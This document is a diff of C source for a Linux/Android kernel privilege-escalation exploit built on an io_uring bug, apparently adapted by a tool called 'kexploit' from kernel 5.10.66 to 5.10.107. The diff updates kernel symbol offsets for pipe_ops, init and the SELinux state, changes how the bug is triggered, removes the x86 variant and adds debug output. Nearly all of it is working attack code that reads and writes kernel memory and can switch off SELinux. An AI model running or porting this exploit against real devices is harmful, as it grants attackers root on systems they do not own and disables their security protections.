@@ -1,3 +1,8 @@
+
+// Exploit adapted by kexploit
+// Original kernel name: ingots_5.10.66
+// Adaptation kernel name: ingots_5.10.107
+
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -485,11 +490,13 @@ void io_uring_submit_sqe(IoUring *io_uring, struct io_uring_sqe *sqe) {
 }
 
 void io_uring_enter_submit(IoUring *io_uring, u32 submit_count) {
-  SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, submit_count, 0, 0, NULL, 0));
+  int result = SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, submit_count, 0, 0, NULL, 0));
+  printf("io_uring_enter_submit: succesfully submited %d entries\n", result);
 }
 
 void io_uring_enter_poll(IoUring *io_uring, u32 poll_count) {
-  SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, 0, poll_count, IORING_ENTER_GETEVENTS, NULL, 0));
+  int result = SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, 0, poll_count, IORING_ENTER_GETEVENTS, NULL, 0));
+  printf("io_uring_enter_poll: result: %d\n", result);
 }
 
 struct pipe_buffer_t {
@@ -507,9 +514,6 @@ usize kaslr_base = 0;
 usize phys_base = 0;
 usize linear_base = 0;
 
-#define ARM
-#ifdef ARM
-
 // for arm 5.10.66 android kernel from ingots
 
 #define LIBC_PATH "/apex/com.android.runtime/lib64/bionic/libc.so"
@@ -521,15 +525,15 @@ usize linear_base = 0;
 #define KERNEL_BASE 0xffffffc010000000
 
 // on arm this symbol is called memstart_addr
-#define PAGE_OFFSET_BASE (0xffffffc0124c9998 - KERNEL_BASE)
-#define PIPE_OPS_OFFSET (0xffffffc0123396e8 - KERNEL_BASE)
-#define INIT_OFFSET (0xffffffc0129cbe40 - KERNEL_BASE)
+#define PAGE_OFFSET_BASE (0xffffffc0121bc3d0 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffc01201bc28 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffc012cbc3c0 - KERNEL_BASE)
 
 // optinally define to turn off selinux
-#define SELINUX_STATE_OFFSET (0xffffffc012c73b18 - KERNEL_BASE)
+#define SELINUX_STATE_OFFSET (0xffffffc012e2b9a8 - KERNEL_BASE)
 
 // first 64 bit word of kernel image
-#define KERNEL_START_WORD 0x149abfff91005a4d
+#define KERNEL_START_WORD 0x14a47fff91005a4d
 
 #define VMEMMAP_START 0xfffffffeffe00000
 #define LINEAR_BASE 0xffffff8000000000
@@ -547,41 +551,10 @@ usize is_kernel_address(usize addr) {
   return (addr & 0xffffffc000000000) == 0xffffffc000000000;
 }
 
-#else
-
-// for x86 build of 5.10.66 kernel using lts kernel config from kernelctf
-
-#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"
-#define SHELL "/bin/bash"
-
-#define SPRAY_SIZE 192
-
-#define KERNEL_BASE 0xffffffff81000000
-
-#define PAGE_OFFSET_BASE (0xffffffff82edd490 - KERNEL_BASE)
-#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
-#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
-
-// first 64 bit word of kernel image
-#define KERNEL_START_WORD 0x4802603f51258d48
-
-usize addr_to_page(usize addr) {
-  return ((addr >> 12) << 6) + vmem_base;
-}
-
-usize is_linear_address(usize addr) {
-  return (addr & 0xffff000000000000) == 0xffff000000000000;
-}
-
-usize is_kernel_address(usize addr) {
-  return (addr & 0xffffffff80000000) == 0xffffffff80000000;
-}
-
-#endif
-
 typedef struct {
   IoUring io_uring;
   int read_poll_fd;
+  int read_poll_fd2;
   pthread_t trigger_thread;
   int pipe_to_thread[2];
   int pipe_from_thread[2];
@@ -603,13 +576,18 @@ void *trigger_thread(void *arg) {
   struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
   memset(sqe, 0, sizeof(struct io_uring_sqe));
   sqe->opcode = IORING_OP_READ;
-  sqe->fd = context.read_poll_fd;
+  // sqe->flags = 0;
+  sqe->flags = IOSQE_IO_DRAIN;
+  sqe->fd = context.read_poll_fd2;
   sqe->off = 0;
   sqe->addr = (usize) context.buf;
   sqe->len = 4096;
   sqe->user_data = 0x6969;
 
   io_uring_submit_sqe(&context.io_uring, sqe);
+  // io_uring_enter_submit(&context.io_uring, 1);
+  // io_uring_enter_poll(&context.io_uring, 1);
+
   io_uring_enter_submit(&context.io_uring, 1);
 
   struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
@@ -633,6 +611,7 @@ void setup_bug() {
   // init_barrier(&context.trigger_barrier, 2);
   // context.read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
   context.read_poll_fd = SYSCHK(open(LIBC_PATH, O_RDONLY | O_DIRECT | O_NONBLOCK));
+  context.read_poll_fd2 = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libm.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
   context.buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
   // prefault pipes
@@ -646,17 +625,12 @@ void setup_bug() {
   // spawn other thread before allocating io uring stuff
   pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);
 
-  // have other thread submit read
-  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
-
-  // wait for it to finish
-  SYSCHK(read(context.pipe_from_thread[0], context.buf, 1));
-
   // submit 1 random read, to give our own task a valid current->io_uring
   // otherwise it is null, since there is a bug in kernel poll with iopoll does not set this up
-  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
+  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[1];
   memset(sqe, 0, sizeof(struct io_uring_sqe));
   sqe->opcode = IORING_OP_READ;
+  // sqe->flags = IOSQE_IO_DRAIN;
   sqe->fd = context.read_poll_fd;
   sqe->off = 0;
   sqe->addr = (usize) context.buf;
@@ -665,10 +639,27 @@ void setup_bug() {
 
   io_uring_submit_sqe(&context.io_uring, sqe);
   io_uring_enter_submit(&context.io_uring, 1);
+
+  // have other thread submit read
+  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
+
+  // wait for it to finish
+  SYSCHK(read(context.pipe_from_thread[0], context.buf, 1));
 }
 
 void trigger_bug() {
+  struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
+  // printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
+  // printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
   io_uring_enter_poll(&context.io_uring, 2);
+  io_uring_enter_poll(&context.io_uring, 1);
+  cqes = io_uring_get_cqe(&context.io_uring);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
+  // io_uring_enter_poll(&context.io_uring, 1);
+  // cqes = io_uring_get_cqe(&context.io_uring);
+  // printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
+  // printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
   SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
   pthread_join(context.trigger_thread, NULL);
 }
@@ -865,8 +856,6 @@ void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
   }
 }
 
-#ifdef ARM
-
 void scan_kernel_phys_base() {
   // scanning did not work for some reason
   phys_base = PHYS_BASE;
@@ -880,22 +869,6 @@ void scan_kernel_phys_base() {
   //   phys_base += 0x1000;
   // }
 }
-
-#else
-
-void scan_kernel_phys_base() {
-  usize start_bytes = KERNEL_START_WORD;
-  phys_base = 0;
-  for (;;) {
-    if (read64(phys_base) == start_bytes) {
-      break;
-    }
-
-    phys_base += 0x1000;
-  }
-}
-
-#endif
 
 void exploit() {
   int start_step_pipes[2] = { 0 };
